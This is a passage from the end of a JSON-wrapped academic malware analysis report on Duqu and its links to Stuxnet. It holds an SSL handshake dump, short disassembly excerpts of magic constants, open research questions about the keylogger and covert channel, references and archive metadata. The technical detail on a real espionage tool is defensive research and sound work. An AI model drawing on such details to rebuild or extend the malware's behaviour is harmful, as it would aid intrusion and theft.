bf 24 bf ab 8b 3b 5a 35 3c 69 ba e5 22 f7 5a >>> SSL 3.0 ChangeCipherSpec [length 0001] 01 >>> SSL 3.0 Handshake [length 0028], Finished 14 00 00 24 5a 1d d0 06 ad 66 19 5d 46 a9 f0 03 61 3a a1 0d e9 56 8a 19 c5 7e 91 11 80 db 6a 42 b2 18 14 98 2b fd b6 48 <<< SSL 3.0 ChangeCipherSpec [length 0001] 01 <<< SSL 3.0 Handshake [length 0028], Finished 14 00 00 24 d3 40 5a ec b8 26 6d d5 10 7d 58 17 29 83 ca b9 8c 31 3e 80 54 4d 12 ba 7e bc 8b b1 68 ab 47 04 d2 b9 67 ca --- Certificate chain 0 s:/CN=\\x00* i:/CN=\\x00* --- Server certificate -----BEGIN CERTIFICATE----- MIIBFzCBwqADAgECAhBO9kg1hUB1rEdBMtTc6dCcMA0GCSqGSIb3DQEBBQUAMA0x CzAJBgNVBAMeAgAqMB4XDTEwMDEwMTE2MDAwMFoXDTIwMDEwMTE2MDAwMFowDTEL MAkGA1UEAx4CACowXDANBgkqhkiG9w0BAQEFAANLADBIAkEA0drSlHjuolaWiBTQ OEk2ng8bF3FCejIBQrQXPkCHy8G9lGL2+PlCUzR4qfkBUI858Cz0Nt0kdCaGeRE4 lHiBNQIDAQABMA0GCSqGSIb3DQEBBQUAA0EAeiZDhnVJwhVO7VvN7a4kBlbyBN13 suFIBU6fL6i+OHFJyQ22oOx36uSjjO0Lt3w2pXEP2FfDlBfd9+plDXx5Zg== -----END CERTIFICATE----- subject=/CN=\\x00* issuer=/CN=\\x00* --- No client certificate CA names sent --- SSL handshake has read 447 bytes and written 233 bytes --- New, TLSv1/SSLv3, Cipher is RC4-SHA Server public key is 512 bit Secure Renegotiation IS NOT supported Compression: NONE Expansion: NONE SSL-Session: Protocol : SSLv3 Cipher : RC4-SHA Session-ID: 600E0000998281BB47ABFC237906077F116F0AFDB09A5603AB782E6E13099EE5 Session-ID-ctx: Master-Key: 73917F3FEF0B57C67098302F43162B977F4E8A16846C75A051B0623104FCDD0270F97B3F78A30D9ADACBD0CA190BA3CA Key-Arg : None Start Time: 1318181593 Timeout : 7200 (sec) Verify return code: 18 (self signed certificate)||\n\n\n**Sample 30 – Another handshake with SSLv3 (server certificate remains the same)**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 56\n\n\n-----\n\n## 14. Relations to other papers\n\n[EsetMicrosope] says „Stuxnet stores its encrypted configuration data (1860 bytes) in\n_%WINDIR%\\inf\\mdmcpq3.pnf.”, however, it is just the first part of the 6619 bytes config file in our_\nStuxnet sample. We don’t yet know the goal for the other 4k.\n\nSome papers including [SymantecDossier] identified 0x19790509 as an important magic string\nused in Stuxnet. However, they don’t mention the magic string 0xAE790509 found in the\nbeginning of the Stuxnet configuration file (and Duqu as well). The two numbers only differ\nin the first character. In the code below, there is another magic string 0xAE1979DD copied from\nStuxnet DLL dropper. This seems to be interesting.\n\nThe other interesting magic is 0xAE. In Duqu, 0xAE comes up at many different places, so does for\nStuxnet. As described above, it’s part of the magic in the config file, and both Duqu and Stuxnet uses\n0xAE240682 for configuration file encryption. For Stuxnet, some payload is encrypted with\n0x01AE0000 and 0x02AE0000. The bzip2 encoded parts of the keylogger log file have a\nmagic “AEh91AY “BZh91AY…”, so again AE is the magic modification (note, however, that\nsome other affected bzip2 compressed files begin with “ABh91AY”) The question is, if Duqu\njust reuses parts of the Stuxnet code and the author does not closely relates to the Stuxnet\nauthors, why both use 0xAE so often?\n```\n 100016BA E86B090000         call SUB_L1000202A\n 100016BF 83C40C           add esp,0000000Ch\n 100016C2 8D4580           lea eax,[ebp-80h]\n 100016C5 35DD7919AE         xor eax,AE1979DDh\n 100016CA 33C9            xor ecx,ecx\n 100016CC 894580           mov [ebp-80h],eax\n 100016CF 894D84           mov [ebp-7Ch],ecx\n 100016D2 8B4508           mov eax,[ebp+08h]\n 100016D5 8B4008           mov eax,[eax+08h]\n 100016D8 051A1F0010         add eax,L10001F1A\n\n```\n**Sample 31 – Some AE magic number from Stuxnet payload DLL**\n\n.text:10002534 loc_10002534:              ; CODE XREF: general_handler_1000244C+EA j �\n```\n.text:10002534         xor   eax, eax\n.text:10002536         jnz   short loc_10002534\n.text:10002538\n\n```\n.text:10002538 loc_10002538:              ; CODE XREF: general_handler_1000244C+37 j �\n```\n.text:10002538         mov   eax, [ebp+arg_0]\n.text:1000253B         xor   eax, 0AE1979DDh\n.text:10002540         xor   ecx, ecx\n.text:10002542         mov   edx, [ebp+arg_0]\n.text:10002545         mov   [edx], eax\n.text:10002547         mov   [edx+4], ecx\n.text:1000254A         xor   eax, eax\n.text:1000254C\n\n```\n.text:1000254C loc_1000254C:              ; CODE XREF: general_handler_1000244C+1E j �\n\n.text:1000254C                     ; general_handler_1000244C+D5 j �\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 57\n\n\n-----\n\n|.text:1000254C pop esi|Col2|\n|---|---|\n|.text:1000254D leave .text:1000254E retn .text:1000254E general_handler_1000244C endp||\n\n\n**Sample 32 – Duqu payload Res302 magic string at general handler**\n\n## 15. Unanswered questions\n\nOur goal was to make an initial analysis that raises attention to this case of targeted\nmalware. As we are in academia, we have limited resources to analyze malware behavior.\nThat means we leave several questions for further investigation. We collected some of these\nquestions to inspire others:\n\n  - Is there any exploit, especially 0-day in Duqu?\n\n  - How does Duqu infect computers?\n\n  - What are the differences in the RPC functions of Duqu and Stuxnet. And between\njminet and cmi4432?\n\n  - How is the netp191.pnf 0x9200 .zdata section compressed, and what is it’s goal? Is it\na copy of the DLL 302 resource itself?\n\n  - What is the reason for having the two separate types: jminet and cmi4432?\n\n  - What is the exact communication protocol for the covert channel? Where is TLS?\nWhat’s inside? When does it generate self-signed cert? How does it check remote\ncert?\n\n  - Is there anything more interesting in the keylogger, any novel method, trick?\n\n  - Exactly how is the keylogger controlled? What is saved at starting time, what is saved\nperiodically and how to control the keylogger?\n\n  - How exactly the keylogger commands work: quit,v,restart,in,out, etc.\n\n  - Where is the initial delay of the kernel driver specified?\n\n  - Where is the expiry of the worm specified?\n\n  - Exactly what is the goal of the strings of the Config-3 of the code, how does it relate\nto the removal of the malware after it’s expiry? How does it identify it’s own files in\ndrivers and inf directories?\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 58\n\n\n-----\n\n## 16. Conclusion\n\nWhile many expected to have follow-up work on Stuxnet (see [LangnerCSM]), the malware\nsample we analyzed explicitly shows that this is reality. We’ve made an initial analysis to\nprove our claims and to raise attention to the issue. We hope that our work will help to find\nout the clues of the story and help to understand targeted attacks more deeply. We also\nhope that the findings will encourage research on the topic which finally will help us to\nbetter mitigate the problem area.\n\n## 17. References\n\n**[EsetMicroscope] Stuxnet Under the Microscope – ESET**\nhttp://www.eset.com/resources/white-papers/Stuxnet_Under_the_Microscope.pdf\n\n**[Chappell 2010] Chappell, Geoff. The MRXCLS.SYS Malware Loader . October 14. 2010.**\nhttp://www.geoffchappell.com/viewer.htm?doc=notes/security/stuxnet/\nmrxcls.htm.\n\n**[SymantecDossier] Symantec, W32.Stuxnet Dossier, v. 1.2**\nhttp://www.symantec.com/content/en/us/enterprise/media/security_response/whitepaper\ns/w32_stuxnet_dossier.pdf\n\n**[ThabetMrxCls] MrxCls –Amr Thabet: Stuxnet Loader Driver**\n\n**[LangnerCSM] Csmonitor, Mark Clayton, Ralph Langner. From the man who discovered**\nStuxnet, dire warnings one year later http://www.csmonitor.com/USA/2011/0922/Fromthe-man-who-discovered-Stuxnet-dire-warnings-one-year-later/%28page%29/1\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 59\n\n\n-----\n\n## 18. Contact Information\n\nQuestions and comments are welcome. The corresponding author is\nDr. Boldizsár Bencsáth\nbencsath@crysys.hu\n\nLaboratory of Cryptography and System Security\nCrySyS Adat- és Rendszerbiztonság Laboratórium\nhttp://www.crysys.hu/\n\nBudapest University of Technology and Economics\nDepartment of Telecommunications\n1117 Magyar Tudósok Krt. 2.\nBudapest, Hungary\n\nGPG BENCSATH Boldizsar <boldi@crysys.hu>\nKey ID 0x64CF6EFB\nFingerprint 286C A586 6311 36B3 2F94 B905 AFB7 C688 64CF 6EFB\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 60\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/ICS SCADA/Duqu/Duqu A Stuxnet-like malware found in the wild.pdf"
    ],
    "report_names": [
        "Duqu A Stuxnet-like malware found in the wild.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535962,
    "ts_updated_at": 1743041369,
    "ts_creation_date": 1319123926,
    "ts_modification_date": 1319123926,
    "files": {
        "pdf": "https://archive.orkl.eu/99192e06113c35ba0508d7606a11774440ef3fe9.pdf",
        "text": "https://archive.orkl.eu/99192e06113c35ba0508d7606a11774440ef3fe9.txt",
        "img": "https://archive.orkl.eu/99192e06113c35ba0508d7606a11774440ef3fe9.jpg"
    }
}